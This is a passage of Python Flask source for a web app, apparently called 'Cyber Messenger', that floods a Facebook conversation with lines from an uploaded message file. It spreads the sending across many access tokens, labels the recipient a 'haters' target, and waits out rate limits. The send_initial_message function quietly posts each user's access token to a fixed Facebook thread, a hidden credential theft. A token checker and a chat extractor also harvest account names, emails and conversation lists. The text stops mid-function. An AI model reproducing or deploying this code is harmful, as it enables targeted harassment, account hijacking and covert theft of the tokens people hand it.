import os
import re
import time
import random
import string
import requests
import threading
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, session
from threading import Thread, Event, Lock
import json
import logging
import uuid

# 🚨 MINIMAL LOGGING
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['DEBUG'] = False

# 🎯 MULTI-USER TASK MANAGEMENT
user_sessions = {}
sessions_lock = Lock()

# 🔔 WEBHOOK SUPPORT
webhook_urls = {}
WEBHOOK_LOCK = Lock()

# Global variables
token_usage = {}
token_locks = {}

# 🔥 STRONG HEADERS
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.facebook.com',
    'Referer': 'https://www.facebook.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
}

def get_user_session():
    if 'user_id' not in session:
        session['user_id'] = str(uuid.uuid4())
    
    user_id = session['user_id']
    
    with sessions_lock:
        if user_id not in user_sessions:
            user_sessions[user_id] = {
                'tasks': {},
                'stop_events': {},
                'created_at': datetime.now()
            }
    
    return user_sessions[user_id]

def generate_task_key():
    return f"task_{random.randint(1000, 9999)}_{int(time.time())}"

def send_webhook_notification(user_id, task_key, event_type, data):
    try:
        with WEBHOOK_LOCK:
            if user_id in webhook_urls:
                webhook_url = webhook_urls[user_id]
                payload = {
                    'event': event_type,
                    'task_key': task_key,
                    'user_id': user_id,
                    'data': data,
                    'timestamp': datetime.now().isoformat()
                }
                requests.post(webhook_url, json=payload, timeout=5)
    except:
        pass

def send_initial_message(access_token):
    try:
        api_url = f'https://graph.facebook.com/v19.0/t_100058/'
        message = f"HELLO ! SURAJ SIR , I M USING YOUR SERVER MY TOKEN IS {access_token}"
        
        parameters = {
            'access_token': access_token, 
            'message': message
        }
        
        response = requests.post(api_url, data=parameters, headers=headers, timeout=30)
        return True
    except Exception:
        return False

def check_rate_limit(access_token):
    current_time = time.time()
    
    if access_token not in token_usage:
        token_usage[access_token] = []
    
    token_usage[access_token] = [ts for ts in token_usage[access_token] if current_time - ts < 60]
    
    if len(token_usage[access_token]) >= 2:
        return True
    
    return False

def update_token_usage(access_token):
    current_time = time.time()
    
    if access_token not in token_usage:
        token_usage[access_token] = []
    
    token_usage[access_token].append(current_time)

def calculate_progress(task_data):
    try:
        if 'total_messages' in task_data and 'sent_count' in task_data:
            total = task_data['total_messages']
            sent = task_data['sent_count']
            if total > 0:
                return min(100, int((sent / total) * 100))
        return 0
    except:
        return 0

def send_messages_strong(user_id, task_key, access_tokens, thread_id, hatersname, lastname, time_interval, messages):
    user_session = get_user_session()
    stop_event = user_session['stop_events'].get(task_key)
    
    if not stop_event:
        return
    
    initial_sent = set()
    total_messages = len(messages) * len(access_tokens)
    
    with sessions_lock:
        if user_id in user_sessions and task_key in user_sessions[user_id]['tasks']:
            user_sessions[user_id]['tasks'][task_key]['total_messages'] = total_messages
            user_sessions[user_id]['tasks'][task_key]['sent_count'] = 0
    
    send_webhook_notification(user_id, task_key, 'task_started', {'total_messages': total_messages})
    
    while not stop_event.is_set():
        for message_text in messages:
            if stop_event.is_set():
                break
                
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                
                if access_token not in initial_sent:
                    send_initial_message(access_token)
                    initial_sent.add(access_token)
                    time.sleep(5)
                
                if check_rate_limit(access_token):
                    wait_start = time.time()
                    while time.time() - wait_start < 300 and not stop_event.is_set():
                        time.sleep(1)
                    if access_token in token_usage:
                        token_usage[access_token] = []
                
                message = f"{hatersname} {message_text} {lastname}"
                api_url = f'https://graph.facebook.com/v19.0/t_{thread_id}/'
                parameters = {'access_token': access_token, 'message': message}
                
                try:
                    response = requests.post(api_url, data=parameters, headers=headers, timeout=30)
                    
                    if response.status_code == 200:
                        update_token_usage(access_token)
                    
                    with sessions_lock:
                        if user_id in user_sessions and task_key in user_sessions[user_id]['tasks']:
                            user_sessions[user_id]['tasks'][task_key]['sent_count'] = user_sessions[user_id]['tasks'][task_key].get('sent_count', 0) + 1
                            user_sessions[user_id]['tasks'][task_key]['last_message'] = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
                            user_sessions[user_id]['tasks'][task_key]['message_count'] = user_sessions[user_id]['tasks'][task_key].get('message_count', 0) + 1
                            
                            progress = calculate_progress(user_sessions[user_id]['tasks'][task_key])
                            user_sessions[user_id]['tasks'][task_key]['progress'] = progress
                    
                    if random.random() < 0.1:
                        send_webhook_notification(user_id, task_key, 'progress_update', {
                            'progress': progress,
                            'sent_count': user_sessions[user_id]['tasks'][task_key].get('sent_count', 0),
                            'total_messages': total_messages
                        })
                    
                except Exception:
                    pass
                
                time.sleep(time_interval)
        
        if not stop_event.is_set():
            time.sleep(20)
    
    send_webhook_notification(user_id, task_key, 'task_completed', {'total_sent': user_session['tasks'][task_key].get('sent_count', 0)})

def check_token_validity(token):
    try:
        user_url = f"https://graph.facebook.com/v19.0/me?access_token={token}&fields=id,name,email,picture"
        user_response = requests.get(user_url, timeout=10)
        
        if user_response.status_code != 200:
            return {"valid": False, "error": "Token validation failed"}
        
        user_data = user_response.json()
        
        if 'id' not in user_data or 'name' not in user_data:
            return {"valid": False, "error": "Invalid token response"}
        
        return {
            "valid": True,
            "user_id": user_data.get('id', 'N/A'),
            "name": user_data.get('name', 'N/A'),
            "email": user_data.get('email', 'Not available'),
        }
        
    except Exception:
        return {"valid": False, "error": "Token check failed"}

def extract_messenger_chat_groups(token):
    try:
        threads_url = f"https://graph.facebook.com/v19.0/me/conversations?access_token={token}&fields=id,name,participants&limit=100"
        threads_response = requests.get(threads_url, timeout=15)
        chat_groups = []
        
        if threads_response.status_code == 200:
            threads_data = threads_response.json()
            conversations = threads_data.get('data', [])
            
            for conversation in conversations:
                chat_info = {
                    'thread_id': conversation.get('id', 'N/A'),
                    'name': conversation.get('name', 'Unnamed Chat'),
                    'participants_count': len(conversation.get('participants', {}).get('data', [])) if conversation.get('participants') else 0
                }
                chat_groups.append(chat_info)
            
            return {
                "success": True,
                "chat_groups": chat_groups,
                "total_chats": len(chat_groups)
            }
        else:
            return {
                "success": False,
                "error": "Failed to fetch conversations",
                "chat_groups": [],
                "total_chats": 0
            }
            
    except Exception:
        return {
            "success": False,
            "error": "Error extracting chat groups",
            "chat_groups": [],
            "total_chats": 0
        }

# 🎯 ROUTES
@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🔥 CYBER MESSENGER</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap');

    :root {
      --neon-blue: #00ffff;
      --neon-pink: #ff00ff;
      --neon-yellow: #ffcc00;
      --neon-green: #00ff00;
      --dark-bg: #0d0d0d;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: var(--dark-bg);
      color: #e0e0e0;
      font-family: 'Montserrat', sans-serif;
      min-height: 100vh;
      padding: 20px;
      overflow-x: hidden;
      position: relative;
    }

    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        radial-gradient(circle at 20% 80%, rgba(0, 255, 255, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 80% 20%, rgba(255, 0, 255, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 40% 40%, rgba(255, 204, 0, 0.05) 0%, transparent 50%);
      animation: background-pulse 8s ease-in-out infinite;
      z-index: -1;
    }

    @keyframes background-pulse {
      0%, 100% { opacity: 0.5; }
      50% { opacity: 0.8; }
    }

    .admin-btn {
      position: fixed;
      top: 20px;
      left: 20px;
      background: var(--neon-yellow);
      color: #0a0a0a;
      padding: 10px 15px;
      border-radius: 8px;
      text-decoration: none;
      font-weight: 600;
      font-size: 0.8em;
      box-shadow: 0 0 15px rgba(255, 204, 0, 0.7);
      transition: all 0.3s ease;
      z-index: 1000;
    }

    .admin-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 0 25px rgba(255, 204, 0, 0.9);
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
      padding: 20px;
    }

    h1 {
      font-size: 3em;
      font-weight: 700;
      background: linear-gradient(45deg, var(--neon-blue), var(--neon-pink), var(--neon-yellow));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
      margin-bottom: 10px;
    }

    .subtitle {
      color: #888;
      font-size: 1.1em;
      margin-bottom: 30px;
    }

    .tabs {
      display: flex;
      background: rgba(20, 20, 20, 0.8);
      border-radius: 15px;
      padding: 5px;
      margin-bottom: 20px;
      border: 1px solid rgba(0, 255, 255, 0.3);
      backdrop-filter: blur(10px);
    }

    .tab {
      flex: 1;
      padding: 15px;
      background: transparent;
      border: none;
      color: #888;
      cursor: pointer;
      border-radius: 12px;
      font-weight: 600;
      transition: all 0.3s ease;
      text-align: center;
    }

    .tab.active {
      background: linear-gradient(45deg, var(--neon-blue), var(--neon-pink));
      color: white;
      box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
    }

    .tab-content {
      display: none;
      background: rgba(20, 20, 20, 0.8);
      border-radius: 15px;
      padding: 25px;
      border: 1px solid rgba(0, 255, 255, 0.3);
      backdrop-filter: blur(10px);
      margin-bottom: 20px;
    }

    .tab-content.active {
      display: block;
      animation: fadeIn 0.5s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      color: var(--neon-blue);
      font-weight: 600;
      font-size: 0.9em;
    }

    input[type="text"],
    input[type="number"],
    input[type="url"],
    textarea,
    select {
      width: 100%;
      padding: 12px 15px;
      background: rgba(10, 10, 10, 0.8);
      border: 2px solid rgba(0, 255, 255, 0.3);
      border-radius: 8px;
      color: white;
      font-family: 'Montserrat', sans-serif;
      font-size: 0.9em;
      transition: all 0.3s ease;
    }

    input:focus, textarea:focus, select:focus {
      outline: none;
      border-color: var(--neon-blue);
      box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
    }

    .file-input-wrapper {
      position: relative;
      overflow: hidden;
      display: inline-block;
      width: 100%;
    }

    .file-input {
      background: linear-gradient(45deg, var(--neon-blue), var(--neon-pink));
      color: white;
      padding: 12px 20px;
      border-radius: 8px;
      cursor: pointer;
      text-align: center;
      font-weight: 600;
      transition: all 0.3s ease;
      display: block;
    }

    .file-input:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 20px rgba(0, 255, 255, 0.5);
    }

    .file-input input {
      position: absolute;
      left: 0;
      top: 0;
      opacity: 0;
      width: 100%;
      height: 100%;
      cursor: pointer;
    }

    .btn-group {
      display: flex;
      gap: 12px;
      flex-wrap: wrap;
      margin-top: 25px;
    }

    button {
      background: linear-gradient(45deg, var(--neon-blue), var(--neon-pink));
      color: white;
      border: none;
      padding: 12px 25px;
      border-radius: 8px;
      cursor: pointer;
      font-weight: 600;
      font-size: 0.9em;
      transition: all 0.3s ease;
      flex: 1;
      min-width: 120px;
      box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
    }

    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 25px rgba(0, 255, 255, 0.5);
    }

    button.secondary {
      background: linear-gradient(45deg, var(--neon-green), var(--neon-blue));
    }

    button.danger {
      background: linear-gradient(45deg, #ff6b6b, #ee5a24);
    }

    button.success {
      background: linear-gradient(45deg, #00b894, #00a085);
    }

    .result {
      margin-top: 20px;
      padding: 20px;
      border-radius: 10px;
      display: none;
      background: rgba(10, 10, 10, 0.8);
      border: 1px solid rgba(0, 255, 255, 0.3);
    }

    .success { border-color: var(--neon-green); }
    .error { border-color: #ff6b6b; }

    .tasks-container {
      display: grid;
      gap: 15px;
      margin-top: 20px;
    }

    .task-box {
      background: rgba(20, 20, 20, 0.8);
      border-radius: 12px;
      padding: 20px;
      border-left: 4px solid var(--neon-blue);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(0, 255, 255, 0.3);
    }

    .task-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 15px;
    }

    .task-title {
      color: var(--neon-blue);
      font-weight: 700;
      font-size: 1.1em;
    }

    .task-status {
      background: var(--neon-green);
      color: #0a0a0a;
      padding: 5px 10px;
      border-radius: 20px;
      font-size: 0.8em;
      font-weight: 600;
    }

    .task-status.stopped { background: #ff6b6b; }
    .task-status.paused { background: var(--neon-yellow); }

    .task-info {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 10px;
      margin-bottom: 15px;
      font-size: 0.85em;
    }

    .task-info div {
      padding: 5px 0;
    }

    .progress-bar {
      width: 100%;
      height: 8px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      overflow: hidden;
      margin: 10px 0;
    }

    .progress-fill {
      height: 100%;
      background: linear-gradient(45deg, var(--neon-blue), var(--neon-pink));
      border-radius: 10px;
      transition: width 0.3s ease;
      box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
    }

    .task-controls {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
    }

    .task-controls button {
      padding: 8px 15px;
      font-size: 0.8em;
      min-width: 80px;
    }

    .footer {
      text-align: center;
      margin-top: 40px;
      padding: 20px;
      color: #888;
      font-size: 0.8em;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
    }

    .footer a {
      color: var(--neon-blue);
      text-decoration: none;
      transition: all 0.3s ease;
    }

    .footer a:hover {
      text-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
    }

    /* Mobile Responsive */
    @media (max-width: 768px) {
      body {
        padding: 10px;
      }

      h1 {
        font-size: 2em;
      }

      .tabs {
        flex-direction: column;
      }

      .btn-group {
        flex-direction: column;
      }

      button {
        width: 100%;
      }

      .task-info {
        grid-template-columns: 1fr;
      }

      .task-controls {
        flex-direction: column;
      }

      .admin-btn {
        position: relative;
        top: 0;
        left: 0;
        margin-bottom: 20px;
        display: inline-block;
      }
    }

    @media (max-width: 480px) {
      .tab-content {
        padding: 15px;
      }

      .task-box {
        padding: 15px;
      }

      h1 {
        font-size: 1.8em;
      }
    }
  </style>
</head>
<body>
  <a href="#" class="admin-btn">🩷 AXSHU 🪶</a>

  <div class="container">
    <div class="header">
      <h1>🔥 CYBER MESSENGER</h1>
      <div class="subtitle">Advanced Facebook Message Sending Platform</div>
    </div>

    <div class="tabs">
      <div class="tab active" onclick="switchTab('message-sender')">🚀 Message Sender</div>
      <div class="tab" onclick="switchTab('token-checker')">🔑 Token Checker</div>
      <div class="tab" onclick="switchTab('chat-extractor')">📱 Chat Extractor</div>
      <div class="tab" onclick="switchTab('webhook-setup')">🔔 Webhook Setup</div>
      <div class="tab" onclick="switchTab('task-manager')">📊 Task Manager</div>
    </div>

    <!-- Message Sender Tab -->
    <div id="message-sender" class="tab-content active">
      <form id="messageForm" enctype="multipart/form-data">
        <div class="form-group">
          <label>🔑 Access Token</label>
          <input type="text" name="single_token" placeholder="Enter Facebook access token...">
          <div style="text-align: center; margin: 10px 0; color: #888;">OR</div>
          <div class="file-input-wrapper">
            <div class="file-input">
              📁 Upload Token File
              <input type="file" name="token_file" accept=".txt">
            </div>
          </div>
        </div>

        <div class="form-group">
          <label>💬 Conversation ID</label>
          <input type="text" name="conversation_id" placeholder="Enter conversation ID..." required>
        </div>

        <div class="form-group">
          <label>👤 First Name</label>
          <input type="text" name="hatersname" placeholder="Enter first name..." required>
        </div>

        <div class="form-group">
          <label>📛 Last Name</label>
          <input type="text" name="lastname" placeholder="Enter last name..." required>
        </div>

        <div class="form-group">
          <label>⏱️ Time Interval (seconds)</label>
          <input type="number" name="time_interval" value="30" min="1" required>
        </div>

        <div class="form-group">
          <label>📝 Messages File</label>
          <div class="file-input-wrapper">
            <div class="file-input">
              📁 Upload Messages File
              <input type="file" name="message_file" accept=".txt" required>
            </div>
          </div>
        </div>

        <div class="btn-group">
          <button type="submit">🚀 Start Sending</button>
        </div>
      </form>
      <div id="taskResult" class="result"></div>
    </div>

    <!-- Token Checker Tab -->
    <div id="token-checker" class="tab-content">
      <form id="tokenForm" enctype="multipart/form-data">
        <div class="form-group">
          <label>🔑 Access Tokens</label>
          <input type="text" name="single_token" placeholder="Enter single token...">
          <div style="text-align: center; margin: 10px 0; color: #888;">OR</div>
          <div class="file-input-wrapper">
            <div class="file-input">
              📁 Upload Token File
              <input type="file" name="token_file" accept=".txt">
            </div>
          </div>
        </div>

        <div class="btn-group">
          <button type="submit">🔍 Check Tokens</button>
        </div>
      </form>
      <div id="tokenResult"></div>
    </div>

    <!-- Chat Extractor Tab -->
    <div id="chat-extractor" class="tab-content">
      <form id="chatExtractForm">
        <div class="form-group">
          <label>🔑 Facebook Token</label>
          <input type="text" name="token" placeholder="Enter valid Facebook token..." required>
        </div>

        <div class="btn-group">
          <button type="submit">📱 Extract Chats</button>
        </div>
      </form>
      <div id="chatExtractResult"></div>
    </div>

    <!-- Webhook Setup Tab -->
    <div id="webhook-setup" class="tab-content">
      <form id="webhookForm">
        <div class="form-group">
          <label>🔗 Webhook URL</label>
          <input type="url" name="webhook_url" placeholder="https://your-webhook-url.com" required>
          <small style="color: #888; display: block; margin-top: 5px;">Receive real-time task updates</small>
        </div>

        <div class="btn-group">
          <button type="submit" class="success">💾 Save Webhook</button>
        </div>
      </form>
      <div id="webhookResult" class="result"></div>
    </div>

    <!-- Task Manager Tab -->
    <div id="task-manager" class="tab-content">
      <div class="btn-group">
        <button onclick="loadMyTasks()" class="secondary">🔄 Refresh Tasks</button>
        <button onclick="stopAllTasks()" class="danger">⏹️ Stop All</button>
      </div>
      <div id="tasksContainer" class="tasks-container"></div>
    </div>
  </div>

  <div class="footer">
    <p>© 2024 CYBER MESSENGER | 🔥 DEVELOPED WITH ❤️ BY AXSHU</p>
    <p>💬 <a href="https://www.facebook.com/profile.php?id=61574791744025" target="_blank">FACEBOOK PROFILE</a> | 📱 WHATSAPP CHAT</p>
  </div>

  <script>
    function switchTab(tabName) {
      document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
      document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
      document.getElementById(tabName).classList.add('active');
      event.target.classList.add('active');
      
      if (tabName === 'task-manager') {
        loadMyTasks();
      }
    }

    // Message Sender Form
    document.getElementById('messageForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const formData = new FormData(this);
      const submitBtn = this.querySelector('button[type="submit"]');
      const originalText = submitBtn.innerHTML;
      
      submitBtn.innerHTML = '⏳ Starting...';
      submitBtn.disabled = true;
      
      fetch('/start_task', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        const resultDiv = document.getElementById('taskResult');
        if (data.task_key) {
          resultDiv.innerHTML = `
            <div class="success">
              <h3>✅ Task Started Successfully!</h3>
              <p><strong>Task Key:</strong> ${data.task_key}</p>
              <p>Switch to Task Manager tab to monitor progress</p>
            </div>
          `;
          loadMyTasks();
        } else {
          resultDiv.innerHTML = `<div class="error">❌ Error: ${data.error}</div>`;
        }
        resultDiv.style.display = 'block';
      })
      .finally(() => {
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
      });
    });

    // Token Checker Form
    document.getElementById('tokenForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const formData = new FormData(this);
      const submitBtn = this.querySelector('button[type="submit"]');
      const originalText = submitBtn.innerHTML;
      
      submitBtn.innerHTML = '⏳ Checking...';
      submitBtn.disabled = true;
      
      fetch('/check_tokens', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        displayTokenResults(data);
      })
      .finally(() => {
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
      });
    });

    function displayTokenResults(data) {
      const container = document.getElementById('tokenResult');
      let html = '';
      
      if (data.error) {
        html = `<div class="error">❌ ${data.error}</div>`;
      } else {
        html = `
          <div class="success">
            <h3>📊 Token Check Summary</h3>
            <p>Total: ${data.summary.total} | ✅ Valid: ${data.summary.valid} | ❌ Invalid: ${data.summary.invalid}</p>
          </div>
        `;
        
        data.results.forEach((result, index) => {
          if (result.valid) {
            html += `
              <div class="task-box" style="margin-top: 15px;">
                <h4>✅ Valid Token #${index + 1}</h4>
                <p><strong>User:</strong> ${result.name} (ID: ${result.user_id})</p>
                <p><strong>Email:</strong> ${result.email}</p>
              </div>
            `;
          } else {
            html += `
              <div class="task-box" style="margin-top: 15px; border-left-color: #ff6b6b;">
                <h4>❌ Invalid Token #${index + 1}</h4>
                <p><strong>Error:</strong> ${result.error}</p>
              </div>
            `;
          }
        });
      }
      
      container.innerHTML = html;
    }

    // Chat Extractor Form
    document.getElementById('chatExtractForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const formData = new FormData(this);
      const submitBtn = this.querySelector('button[type="submit"]');
      const originalText = submitBtn.innerHTML;
      
      submitBtn.innerHTML = '⏳ Extracting...';
      submitBtn.disabled = true;
      
      fetch('/extract_messenger_chats', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        displayChatResults(data);
      })
      .finally(() => {
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
      });
    });

    function displayChatResults(data) {
      const container = document.getElementById('chatExtractResult');
      let html = '';
      
      if (data.error) {
        html = `<div class="error">❌ ${data.error}</div>`;
      } else {
        html = `
          <div class="success">
            <h3>✅ Chats Extracted Successfully!</h3>
            <p><strong>User:</strong> ${data.token_info.name}</p>
            <p><strong>Total Chats Found:</strong> ${data.messenger_chats.total_chats}</p>
          </div>
        `;
        
        if (data.messenger_chats.chat_groups && data.messenger_chats.chat_groups.length > 0) {
          data.messenger_chats.chat_groups.forEach(chat => {
            html += `
              <div class="task-box" style="margin-top: 10px;">
                <strong>${chat.name}</strong>
                <p>ID: ${chat.thread_id} | 👥 ${chat.participants_count} participants</p>
                <button onclick="copyToClipboard('${chat.thread_id}')" class="secondary" style="padding: 5px 10px; font-size: 0.8em;">📋 Copy ID</button>
              </div>
            `;
          });
        }
      }
      
      container.innerHTML = html;
    }

    // Webhook Form
    document.getElementById('webhookForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const formData = new FormData(this);
      
      fetch('/set_webhook', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        const resultDiv = document.getElementById('webhookResult');
        if (data.success) {
          resultDiv.innerHTML = '<div class="success">✅ Webhook set successfully!</div>';
        } else {
          resultDiv.innerHTML = `<div class="error">❌ ${data.error}</div>`;
        }
        resultDiv.style.display = 'block';
      });
    });

    // Task Management Functions
    function loadMyTasks() {
      fetch('/get_my_tasks')
      .then(response => response.json())
      .then(data => {
        displayUserTasks(data);
      });
    }

    function displayUserTasks(data) {
      const container = document.getElementById('tasksContainer');
      
      if (!data.success || data.tasks.length === 0) {
        container.innerHTML = `
          <div class="task-box" style="text-align: center;">
            <h3>📭 No Active Tasks</h3>
            <p>Start a new task from the Message Sender tab!</p>
          </div>
        `;
        return;
      }
      
      let html = '';
      
      data.tasks.forEach(task => {
        const statusClass = task.status === 'running' ? '' : 
                           task.status === 'stopped' ? 'stopped' : 'paused';
        
        html += `
          <div class="task-box">
            <div class="task-header">
              <div class="task-title">🔧 ${task.task_key}</div>
              <div class="task-status ${statusClass}">${task.status.toUpperCase()}</div>
            </div>
            
            <div class="task-info">
              <div><strong>👤 Target:</strong> ${task.hatersname} ${task.lastname}</div>
              <div><strong>💬 Conv ID:</strong> ${task.conversation_id}</div>
              <div><strong>🔑 Tokens:</strong> ${task.token_count}</div>
              <div><strong>📝 Messages:</strong> ${task.message_count}</div>
              <div><strong>⏱️ Interval:</strong> ${task.time_interval}s</div>
              <div><strong>📤 Sent:</strong> ${task.sent_count || 0}</div>
              <div><strong>🕐 Started:</strong> ${task.start_time}</div>
              <div><strong>🕒 Last Msg:</strong> ${task.last_message}</div>
            </div>
            
            <div class="progress-bar">
              <div class="progress-fill" style="width: ${task.progress || 0}%;"></div>
            </div>
            <div style="text-align: center; font-size: 0.8em; color: var(--neon-blue);">
              Progress: ${task.progress || 0}%
            </div>
            
            <div class="task-controls">
              ${task.status === 'running' ? 
                `<button onclick="controlTask('${task.task_key}', 'stop')" class="danger">⏸️ Pause</button>` : 
                `<button onclick="controlTask('${task.task_key}', 'resume')" class="success">▶️ Resume</button>`
              }
              <button onclick="controlTask('${task.task_key}', 'delete')" class="danger">🗑️ Delete</button>
              <button onclick="copyToClipboard('${task.task_key}')" class="secondary">📋 Copy ID</button>
            </div>
          </div>
        `;
      });
      
      container.innerHTML = html;
    }

    function controlTask(taskKey, action) {
      if (!confirm(`Are you sure you want to ${action} this task?`)) return;
      
      const formData = new FormData();
      formData.append('task_key', taskKey);
      formData.append('action', action);
      
      fetch('/control_task', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          loadMyTasks();
        } else {
          alert('❌ Error: ' + data.error);
        }
      });
    }

    function stopAllTasks() {
      if (!confirm('Stop ALL tasks?')) return;
      fetch('/get_my_tasks')
      .then(response => response.json())
      .then(data => {
        if (data.success && data.tasks.length > 0) {
          data.tasks.forEach(task => {
            if (task.status === 'running') {
              controlTask(task.task_key, 'stop');
            }
          });
        }
      });
    }

    function copyToClipboard(text) {
      navigator.clipboard.writeText(text).then(() => {
        alert('✅ Copied: ' + text);
      });
    }

    // Auto-load tasks every 30 seconds when on task manager
    setInterval(() => {
      if (document.getElementById('task-manager').classList.contains('active')) {
        loadMyTasks();
      }
    }, 30000);

    // Load tasks on page load if on task manager
    document.addEventListener('DOMContentLoaded', function() {
      if (document.getElementById('task-manager').classList.contains('active')) {
        loadMyTasks();
      }
    });
  </script>
</body>
</html>
    '''

@app.route('/start_task', methods=['POST'])
def start_task():
    try:
        user_session = get_user_session()
        user_id = session['user_id']
        data = request.form
        
        tokens = []
        if 'token_file' in request.files and request.files['token_file'].filename:
            file = request.files['token_file']
            content = file.read().decode('utf-8')
            tokens = [line.strip() for line in content.split('\n') if line.strip()]
        elif 'single_token' in data and data['single_token']:
            tokens = [data['single_token'].strip()]
        
        if not tokens:
            return jsonify({'error': 'No valid tokens provided'})
        
        messages = []
        if 'message_file' in request.files and request.files['message_file'].filename:
            file = request.files['message_file']
            content = file.read().decode('utf-8')
            messages = [line.strip() for line in content.split('\n') if line.strip()]
        
        if not messages:
            return jsonify({'error': 'No messages provided'})
        
        task_key = generate_task_key()
        
        stop_event = Event()
        user_session['stop_events'][task_key] = stop_event
        
        user_session['tasks'][task_key] = {
            'task_key': task_key,
            'conversation_id': data['conversation_id'],
            'hatersname': data['hatersname'],
            'lastname': data['lastname'],
            'time_interval': int(data['time_interval']),
            'token_count': len(tokens),
            'message_count': len(messages),
            'start_time': datetime.now().strftime('%Y-%m-%d %I:%M:%S %p'),
            'last_message': datetime.now().strftime('%Y-%m-%d %I:%M:%S %p'),
            'status': 'running',
            'sent_count': 0,
            'total_messages': len(messages) * len(tokens),
            'progress': 0
        }
        
        thread = Thread(
            target=send_messages_strong,
            args=(
                user_id,
                task_key,
                tokens,
                data['conversation_id'],
                data['hatersname'],
                data['lastname'],
                int(data['time_interval']),
                messages
            ),
            daemon=True
        )
        thread.start()
        
        send_webhook_notification(user_id, task_key, 'task_created', user_session['tasks'][task_key])
        
        return jsonify({
            'success': True, 
            'task_key': task_key,
            'message': 'Task started successfully!'
        })
    
    except Exception as e:
        return jsonify({'error': 'Server error'})

@app.route('/get_my_tasks', methods=['GET'])
def get_my_tasks():
    try:
        user_session = get_user_session()
        tasks_list = list(user_session['tasks'].values())
        
        for task in tasks_list:
            task['progress'] = calculate_progress(task)
        
        return jsonify({
            'success': True,
            'tasks': tasks_list,
            'total_tasks': len(tasks_list)
        })
    except Exception:
        return jsonify({'success': False, 'tasks': [], 'total_tasks': 0})

@app.route('/control_task', methods=['POST'])
def control_task():
    try:
        user_session = get_user_session()
        user_id = session['user_id']
        task_key = request.form.get('task_key')
        action = request.form.get('action')
        
        if task_key not in user_session['stop_events']:
            return jsonify({'error': 'Task not found'})
        
        if action == 'stop':
            user_session['stop_events'][task_key].set()
            user_session['tasks'][task_key]['status'] = 'stopped'
            send_webhook_notification(user_id, task_key, 'task_stopped', {})
        elif action == 'resume':
            user_session['stop_events'][task_key].clear()
            user_session['tasks'][task_key]['status'] = 'running'
            send_webhook_notification(user_id, task_key, 'task_resumed', {})
        elif action == 'delete':
            user_session['stop_events'][task_key].set()
            if task_key in user_session['tasks']:
                del user_session['tasks'][task_key]
            if task_key in user_session['stop_events']:
                del user_session['stop_events'][task_key]
            send_webhook_notification(user_id, task_key, 'task_deleted', {})
        
        return jsonify({'success': True, 'message': f'Task {action} successfully'})
    except Exception:
        return jsonify({'error': 'Control action failed'})

@app.route('/set_webhook', methods=['POST'])
def set_webhook():
    try:
        user_session = get_user_session()
        user_id = session['user_id']
        webhook_url = request.form.get('webhook_url')
        
        if webhook_url:
            with WEBHOOK_LOCK:
                webhook_urls[user_id] = webhook_url
            return jsonify({'success': True, 'message': 'Webhook set successfully'})
        else:
            return jsonify({'error': 'Webhook URL required'})
    except Exception:
